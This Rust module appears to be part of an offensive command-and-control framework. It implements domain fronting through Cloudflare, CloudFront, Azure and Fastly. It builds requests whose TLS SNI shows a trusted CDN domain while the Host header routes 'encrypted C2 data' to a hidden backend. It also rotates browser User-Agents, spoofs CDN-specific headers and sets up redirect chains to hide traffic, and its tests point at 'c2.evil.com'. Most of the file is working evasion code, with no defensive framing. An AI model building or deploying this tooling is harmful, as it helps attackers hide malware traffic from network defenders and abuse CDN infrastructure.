//! Domain fronting and CDN-based traffic obfuscation.
//!
//! Domain fronting exploits the difference between the SNI (TLS layer)
//! and the Host header (HTTP layer) to route traffic through legitimate
//! CDN infrastructure while actually reaching a different backend.
//!
//! This module supports:
//! - CDN-based domain fronting (Cloudflare, Fastly, Azure CDN, AWS CloudFront)
//! - SNI-based routing tricks
//! - Legitimate-looking HTTP request generation
//! - Redirect chain following for covert routing

use super::TrafficError;
use serde::{Deserialize, Serialize};

/// Domain fronting configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FrontingConfig {
    /// The legitimate-looking domain for SNI/DNS (e.g., "cdn.microsoft.com")
    pub front_domain: String,
    /// The actual backend host (delivered via Host header)
    pub real_host: String,
    /// CDN provider type (affects request formatting)
    pub cdn: CdnProvider,
    /// HTTP path to use (should look legitimate)
    pub path: String,
    /// Additional headers to blend with legitimate traffic
    pub extra_headers: Vec<(String, String)>,
    /// Use HTTP/2 (more realistic for CDN traffic)
    pub use_h2: bool,
    /// User-Agent string (rotated from a pool of legitimate UAs)
    pub user_agent: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CdnProvider {
    /// Cloudflare — front_domain must be on Cloudflare
    Cloudflare,
    /// AWS CloudFront — use *.cloudfront.net domains
    CloudFront,
    /// Azure CDN — use *.azureedge.net domains
    AzureCdn,
    /// Fastly — use Fastly-hosted domains
    Fastly,
    /// Generic — manual configuration
    Generic,
}

impl Default for FrontingConfig {
    fn default() -> Self {
        Self {
            front_domain: String::new(),
            real_host: String::new(),
            cdn: CdnProvider::Generic,
            path: "/api/v1/telemetry".into(),
            extra_headers: vec![
                ("Accept".into(), "application/json".into()),
                ("Accept-Language".into(), "en-US,en;q=0.9".into()),
                ("Cache-Control".into(), "no-cache".into()),
            ],
            use_h2: true,
            user_agent: None,
        }
    }
}

/// Pool of legitimate-looking User-Agent strings
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
];

/// Legitimate-looking URL paths for different CDN types
const CLOUDFLARE_PATHS: &[&str] = &[
    "/cdn-cgi/trace",
    "/api/v4/zones",
    "/cdn-cgi/rum",
    "/.well-known/acme-challenge",
];

const CLOUDFRONT_PATHS: &[&str] = &[
    "/v1/analytics/collect",
    "/api/telemetry",
    "/sdk/v1/event",
    "/metrics/v2/report",
];

impl FrontingConfig {
    /// Create a Cloudflare fronting configuration
    pub fn cloudflare(front_domain: &str, real_host: &str) -> Self {
        Self {
            front_domain: front_domain.to_string(),
            real_host: real_host.to_string(),
            cdn: CdnProvider::Cloudflare,
            path: CLOUDFLARE_PATHS[0].to_string(),
            ..Default::default()
        }
    }

    /// Create a CloudFront fronting configuration
    pub fn cloudfront(front_domain: &str, real_host: &str) -> Self {
        Self {
            front_domain: front_domain.to_string(),
            real_host: real_host.to_string(),
            cdn: CdnProvider::CloudFront,
            path: CLOUDFRONT_PATHS[0].to_string(),
            ..Default::default()
        }
    }
}

/// Build an HTTP request that implements domain fronting.
/// The TLS SNI will show `front_domain` but the Host header contains `real_host`.
pub fn build_fronted_request(
    config: &FrontingConfig,
    payload: &[u8],
    method: HttpMethod,
) -> Result<FrontedRequest, TrafficError> {
    if config.front_domain.is_empty() || config.real_host.is_empty() {
        return Err(TrafficError::Config("front_domain and real_host required".into()));
    }

    let ua = config.user_agent.clone().unwrap_or_else(|| {
        let idx = (std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as usize) % USER_AGENTS.len();
        USER_AGENTS[idx].to_string()
    });

    let mut headers = vec![
        ("Host".to_string(), config.real_host.clone()),
        ("User-Agent".to_string(), ua),
    ];
    headers.extend(config.extra_headers.clone());

    // For POST/PUT requests, add appropriate Content-Type based on CDN
    if matches!(method, HttpMethod::Post | HttpMethod::Put) {
        let content_type = match config.cdn {
            CdnProvider::Cloudflare => "application/json",
            CdnProvider::CloudFront => "application/octet-stream",
            CdnProvider::AzureCdn => "application/json",
            CdnProvider::Fastly => "application/json",
            CdnProvider::Generic => "application/octet-stream",
        };
        headers.push(("Content-Type".to_string(), content_type.to_string()));
        headers.push(("Content-Length".to_string(), payload.len().to_string()));
    }

    // Add CDN-specific headers that make the request look more legitimate
    match config.cdn {
        CdnProvider::Cloudflare => {
            headers.push(("CF-Connecting-IP".to_string(), "127.0.0.1".to_string()));
        }
        CdnProvider::CloudFront => {
            headers.push(("X-Amz-Cf-Id".to_string(), generate_cf_id()));
        }
        CdnProvider::AzureCdn => {
            headers.push(("X-Azure-Ref".to_string(), generate_azure_ref()));
        }
        _ => {}
    }

    Ok(FrontedRequest {
        tls_sni: config.front_domain.clone(),
        url: format!("https://{}{}", config.front_domain, config.path),
        method,
        headers,
        body: payload.to_vec(),
    })
}

#[derive(Debug, Clone, Copy)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
}

impl std::fmt::Display for HttpMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            HttpMethod::Get => write!(f, "GET"),
            HttpMethod::Post => write!(f, "POST"),
            HttpMethod::Put => write!(f, "PUT"),
        }
    }
}

/// A fully constructed fronted HTTP request
#[derive(Debug, Clone)]
pub struct FrontedRequest {
    /// Domain for TLS SNI (visible to network observers)
    pub tls_sni: String,
    /// Full URL (uses front_domain)
    pub url: String,
    /// HTTP method
    pub method: HttpMethod,
    /// Headers (Host header points to real_host)
    pub headers: Vec<(String, String)>,
    /// Request body (encrypted C2 data)
    pub body: Vec<u8>,
}

impl FrontedRequest {
    /// Format as raw HTTP/1.1 request for debugging/inspection
    pub fn to_raw_http(&self) -> String {
        let mut req = format!("{} {} HTTP/1.1\r\n", self.method, self.url);
        for (k, v) in &self.headers {
            req.push_str(&format!("{k}: {v}\r\n"));
        }
        req.push_str("\r\n");
        if !self.body.is_empty() {
            req.push_str(&format!("[{} bytes body]", self.body.len()));
        }
        req
    }
}

fn generate_cf_id() -> String {
    use rand::RngCore;
    let mut bytes = [0u8; 16];
    rand::rngs::OsRng.fill_bytes(&mut bytes);
    hex::encode(bytes)
}

fn generate_azure_ref() -> String {
    use rand::RngCore;
    let mut bytes = [0u8; 12];
    rand::rngs::OsRng.fill_bytes(&mut bytes);
    format!("0{}", base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD, &bytes
    ))
}

/// Generate a redirect chain configuration.
/// Uses multiple legitimate-looking redirects before reaching the C2 endpoint.
/// Each hop appears to be a normal HTTP redirect (301/302).
#[derive(Debug, Clone)]
pub struct RedirectChain {
    pub hops: Vec<RedirectHop>,
}

#[derive(Debug, Clone)]
pub struct RedirectHop {
    pub domain: String,
    pub path: String,
    pub status_code: u16,
}

impl RedirectChain {
    /// Create a chain that routes through CDN infrastructure
    pub fn new(hops: Vec<(&str, &str)>) -> Self {
        Self {
            hops: hops.into_iter().map(|(domain, path)| RedirectHop {
                domain: domain.to_string(),
                path: path.to_string(),
                status_code: 302,
            }).collect(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cloudflare_fronting() {
        let config = FrontingConfig::cloudflare("cdn.example.com", "c2.evil.com");
        let req = build_fronted_request(&config, b"test", HttpMethod::Post).unwrap();
        // SNI should be the front domain
        assert_eq!(req.tls_sni, "cdn.example.com");
        // Host header should be the real host
        let host = req.headers.iter().find(|(k, _)| k == "Host").unwrap();
        assert_eq!(host.1, "c2.evil.com");
        // URL uses front domain
        assert!(req.url.contains("cdn.example.com"));
    }

    #[test]
    fn test_cloudfront_fronting() {
        let config = FrontingConfig::cloudfront("d1234.cloudfront.net", "real.example.com");
        let req = build_fronted_request(&config, b"data", HttpMethod::Get).unwrap();
        assert_eq!(req.tls_sni, "d1234.cloudfront.net");
        let host = req.headers.iter().find(|(k, _)| k == "Host").unwrap();
        assert_eq!(host.1, "real.example.com");
    }

    #[test]
    fn test_empty_config_rejected() {
        let config = FrontingConfig::default();
        let result = build_fronted_request(&config, b"test", HttpMethod::Get);
        assert!(result.is_err());
    }

    #[test]
    fn test_raw_http_output() {
        let config = FrontingConfig::cloudflare("front.com", "real.com");
        let req = build_fronted_request(&config, b"payload", HttpMethod::Post).unwrap();
        let raw = req.to_raw_http();
        assert!(raw.contains("Host: real.com"));
        assert!(raw.contains("POST"));
    }

    #[test]
    fn test_redirect_chain() {
        let chain = RedirectChain::new(vec![
            ("hop1.example.com", "/redirect"),
            ("hop2.example.com", "/final"),
        ]);
        assert_eq!(chain.hops.len(), 2);
        assert_eq!(chain.hops[0].status_code, 302);
    }
}
